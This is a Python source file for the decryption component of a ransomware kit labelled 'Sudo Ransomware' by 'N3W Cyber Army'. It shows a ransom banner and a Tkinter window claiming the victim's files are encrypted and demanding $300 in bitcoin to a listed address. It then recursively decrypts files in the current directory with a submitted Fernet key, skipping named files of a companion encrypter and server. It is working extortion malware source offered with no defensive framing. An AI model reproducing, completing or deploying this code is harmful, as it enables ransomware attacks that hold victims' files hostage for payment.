from cryptography.fernet import Fernet
from cryptography.fernet import InvalidToken
import os.path 
import pathlib
from tkinter import *
import tkinter.messagebox as MB
import time
from colorama import Fore, Style

SUBJECT = r'''Your important files are encrypted...
Many of your documents,photos, videos, databases and other files are no longer available. because you have been 
encrypted. May be you are busy looking for a way to recover your files. but do not waste your time. Nobody can
recover your files with out our decryption service(Decryption Key). if you want to recover your files send 300$
worth bitcoin to this address... " 8KD4KJ89GFDjf99fk2hH84J8j0JFKS3ADJF89 "
'''

app_banner = r'''
  ██████  █    ██ ▓█████▄  ▒█████      ██▀███   ▄▄▄       ███▄    █   ██████  ▒█████   ███▄ ▄███▓▓█████ 
▒██    ▒  ██  ▓██▒▒██▀ ██▌▒██▒  ██▒   ▓██ ▒ ██▒▒████▄     ██ ▀█   █ ▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀ 
░ ▓██▄   ▓██  ▒██░░██   █▌▒██░  ██▒   ▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░▒███   
  ▒   ██▒▓▓█  ░██░░▓█▄   ▌▒██   ██░   ▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒  ▒   ██▒▒██   ██░▒██    ▒██ ▒▓█  ▄ 
▒██████▒▒▒▒█████▓ ░▒████▓ ░ ████▓▒░   ░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░▒██████▒▒░ ████▓▒░▒██▒   ░██▒░▒████▒
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░
░ ░▒  ░ ░░░▒░ ░ ░  ░ ▒  ▒   ░ ▒ ▒░      ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░ ░ ░  ░
░  ░  ░   ░░░ ░ ░  ░ ░  ░ ░ ░ ░ ▒       ░░   ░   ░   ▒      ░   ░ ░ ░  ░  ░  ░ ░ ░ ▒  ░      ░      ░   
      ░     ░        ░        ░ ░        ░           ░  ░         ░       ░      ░ ░         ░      ░  ░
                   ░                                                                                    '''


class Decrypter(object):

    # automatically intialized method of Encrypter() class
    def __init__(self) -> None:
        self.file_counter = 0
        self.user_key = None
        self.app_banner = app_banner

    def display_banner(self):
        for line in self.app_banner.split('\n'):
            print(f'{Fore.LIGHTRED_EX} {line} {Style.RESET_ALL}')
            time.sleep(0.1)
        print(f'\n\n\t\t {Fore.LIGHTGREEN_EX} [ Developed By: N3W Cyber Army ]{Style.RESET_ALL} \n\n')
        time.sleep(0.2)
        self.decryption_gui()

    # a method to read saved fernet key
    def decryption_gui(self):
        self.root = Tk()
        self.root.title('Decryption Service')
        self.root.geometry('700x400')
        self.root.configure(bg='#620614')
        GUI_MESSAGE_HEADER = Label(self.root, text='Ooops, your files have been hacked & encrypted',
                            font='Times 18 bold', bg='#620614', fg='white')
        GUI_MESSAGE_HEADER.pack()
        GUI_MESSAGE_SUBJECT = Label(self.root, text=SUBJECT,
                            font='Times 11', bg='#620614', fg='white')
        GUI_MESSAGE_SUBJECT.place(x = 2, y = 40)
        GUI_KEY_MESSAGE = Label(self.root, text='Enter Key:',
                            font='Times 13', bg='#620614', fg='white')
        GUI_KEY_MESSAGE.place(x = 122, y = 180)
        # tkinter part to receive and submit decryption key
        self.KEY_INPUT = Entry(self.root, width=35, font='Times 16')
        self.KEY_INPUT.place(x=200, y=180)
        KEY_SUBMIT = Button(self.root, text='submit', command=self.check_key, font='Times 13')
        KEY_SUBMIT.place(x=330, y=220,)
        self.root.eval('tk::PlaceWindow . center')
        self.root.mainloop()

    # a method to verify decryption key
    def check_key(self):
        self.received_key = self.KEY_INPUT.get()
        if not self.received_key:
            MB.showwarning('Wrong Decryption Key', 'Empty key can\'t decrypt you files')
        else:
            self.file_finder()
            MB.showinfo('Decryption Process Finished', f'Congratulations... Total {self.file_counter} files have been decrypted')
    
    # a method to find and list files to be encrypted
    def file_finder(self):
        for file in os.listdir():
            if os.path.isfile(file):
                self.decrypt_file(file)
            elif os.path.isdir(file):
                self.decrypt_folder(file)
                
    # a method list all files found in the folder sent from "file_finder" method
    def decrypt_folder(self, folder):
        for folder_file in pathlib.Path(folder).glob("*"):
            if os.path.isfile(folder_file):
                self.decrypt_file(folder_file)
            elif os.path.isdir(folder_file):
                self.decrypt_folder(folder_file)

    # if the current fie is not folder
    def decrypt_file(self, file):
        try:
            if file != 'encrypter.py' and file != 'key.py' and file != 'thekey.key' and file != 'decrypter.py' and file != 'server.py':
                print(f'{Fore.LIGHTYELLOW_EX}[*]{Style.RESET_ALL} Decrypting {file}')
                # open and read contents of the file
                with open(file, 'rb') as file_obj:
                    file_content = file_obj.read()
                file_obj.close()
                denrypted_content = Fernet(self.received_key).decrypt(file_content)
                # overwrite encrypted file to the file
                with open(file, 'wb') as file_obj:
                    file_obj.write(denrypted_content)
                file_obj.close()
                self.file_counter = self.file_counter + 1
        except:
            print(f'{Fore.RED}[!]{Style.RESET_ALL} The file was not encrypted with this key ')

if __name__ == '__main__':
    # define class reference object and call a single method
    Decrypter_OBJ = Decrypter()
    Decrypter_OBJ.display_banner()